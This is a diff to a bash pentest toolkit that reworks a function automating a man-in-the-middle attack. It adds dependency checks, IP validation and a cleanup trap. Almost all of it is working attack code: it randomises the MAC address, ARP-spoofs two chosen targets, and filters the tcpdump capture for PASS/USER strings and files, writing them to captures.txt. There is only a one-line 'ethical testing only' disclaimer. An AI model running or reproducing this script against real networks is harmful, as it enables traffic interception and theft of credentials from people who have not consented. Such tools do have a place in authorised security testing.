@@ -1400,7 +1400,7 @@
     
     # Define a função x_mitm para realizar um ataque de Man-in-the-Middle (MiTM)
     function x_mitm() {
-        # x_mitm - Perform a Man-in-the-Middle (MiTM) attack
+        # Function: x_mitm - Perform a Man-in-the-Middle (MiTM) attack
             #
             # Description:
             # This script automates the setup and execution of a MiTM attack.
@@ -1420,22 +1420,37 @@
             # Author: R3v4N (w/GPT)
             # Created on: 2025-01-25
             # Last Updated: 2025-01-25
-            # Version: 1.1
+            # Version: 1.2
             #
             # Notes:
             # - Ensure all dependencies are installed.
             # - This script is intended for ethical testing only.
             # - Always have explicit permission before performing MiTM operations.
 
-        ########### VARIABLES ##############
+        # Function to check if all required dependencies are installed
+        function check_dependencies() {
+            local dependencies=("ipcalc" "macchanger" "tilix" "arpspoof" "tcpdump")
+            for tool in "${dependencies[@]}"; do
+                if ! command -v "$tool" &>/dev/null; then
+                    echo -e "${RED}Error: $tool is not installed. Please install it and try again.${RESET}"
+                    exit 1
+                fi
+            done
+        }
 
         # Function to identify the network interface and attack network
         function identify_attack_environment() {
-            INTERFACE=$(ip -br a | grep tap | head -n 1 | awk '{print $1}')
-            NETWORK=$(ipcalc "$(ip -br a | grep tap | head -n 1 | awk '{print $3}' | awk -F '/' '{print $1}')" | grep -F "Network:" | awk '{print $2}')
+            INTERFACE=$(ip -br a | grep tap | awk '{print $1}' | head -n 1)
+            NETWORK=$(ipcalc "$(ip -br a | grep tap | awk '{print $3}' | awk -F '/' '{print $1}')" \
+                | grep -F "Network:" | awk '{print $2}')
+
+            if [[ -z "$INTERFACE" || -z "$NETWORK" ]]; then
+                echo -e "${RED}Error: Could not determine attack interface or network.${RESET}"
+                exit 1
+            fi
         }
 
-        # Display the initial attack information
+        # Function to display attack setup information
         function display_attack_info() {
             clear
             echo "============= 0.0wL ============="
@@ -1444,9 +1459,7 @@
             echo "================================="
         }
 
-        ########### FUNCTIONS ##############
-
-        # Enable packet forwarding on the host system
+        # Function to enable packet forwarding on the system
         function enable_packet_forwarding() {
             echo 1 > /proc/sys/net/ipv4/ip_forward
             echo "================================="
@@ -1454,42 +1467,71 @@
             echo "================================="
         }
 
-        # Set up spoofing and packet capture environment
+        # Function to validate user-entered IP addresses
+        function validate_ip() {
+            local ip="$1"
+            if [[ ! "$ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]] || ! ipcalc -c "$ip" &>/dev/null; then
+                echo -e "${RED}Error: Invalid IP address: $ip${RESET}"
+                return 1
+            fi
+            return 0
+        }
+
+        # Function to set up the MiTM environment
         function setup_mitm_environment() {
-            macchanger -r "$INTERFACE"  # Randomize the MAC address for anonymity
+            macchanger -r "$INTERFACE" || { echo "Error: MAC address change failed."; exit 1; }
 
-            # Start netdiscover in a new Tilix window to scan the network
+            # Start Netdiscover for network discovery
             tilix --action=app-new-window --command="netdiscover -i $INTERFACE -r $NETWORK" &
-            sleep 10  # Allow time for network discovery
+            sleep 10  # Allow time for network scanning
 
-            # Prompt user for target IP addresses
-            echo -n "Enter the IP of TARGET 01: "
-            read -r TARGET_01
-            echo -n "Enter the IP of TARGET 02: "
-            read -r TARGET_02
+            # Prompt user for target IP addresses and validate them
+            while true; do
+                echo -n "Enter the IP of TARGET 01: "
+                read -r TARGET_01
+                validate_ip "$TARGET_01" && break
+            done
 
-            # Launch ARP spoofing against the two targets in a new Tilix session
+            while true; do
+                echo -n "Enter the IP of TARGET 02: "
+                read -r TARGET_02
+                validate_ip "$TARGET_02" && break
+            done
+
+            # Start ARP spoofing in a separate session
             tilix --action=app-new-session --command="arpspoof -i $INTERFACE -t $TARGET_01 -r $TARGET_02" &
 
             # Start packet capture and filter sensitive data
             tcpdump -i "$INTERFACE" -t host "$TARGET_01" and host "$TARGET_02" \
+                'tcp[((tcp[12:1] & 0xf0) >> 4) * 4:]' \
                 | grep -E '\[P.\]' \
                 | grep -E 'PASS|USER|html|GET|pdf|jpeg|jpg|png|txt' \
                 | tee captures.txt
+    }
+
+        # Function to clean up and restore system settings
+        function cleanup() {
+            echo -e "${YELLOW}Stopping attack and restoring system settings...${RESET}"
+            pkill -f arpspoof
+            pkill -f tcpdump
+            macchanger -p "$INTERFACE"  # Restore the original MAC address
+            echo "Cleanup complete."
         }
 
-        ########### MAIN WORKFLOW ##########
-
+        # Function to run the full MiTM attack workflow
         function main_mitm() {
-            identify_attack_environment  # Identify the attack interface and network
-            display_attack_info          # Display information about the attack setup
-            enable_packet_forwarding     # Enable packet forwarding
-            setup_mitm_environment       # Configure the MiTM environment and capture traffic
-            exit_to_main_menu            # Return to the main menu
+            trap cleanup EXIT  # Ensure cleanup runs on script exit
+
+            check_dependencies       # Verify required tools are installed
+            identify_attack_environment  # Detect attack network and interface
+            display_attack_info      # Display attack setup information
+            enable_packet_forwarding # Enable system packet forwarding
+            setup_mitm_environment   # Configure MITM attack environment
+            exit_to_main_menu        # Return to the main menu
         }
 
-        ########### EXECUTION ##########
-        main_mitm  # Start the main workflow
+        # Execute the MiTM attack workflow
+        main_mitm
     }
 
     # Portscan usando bashsocket
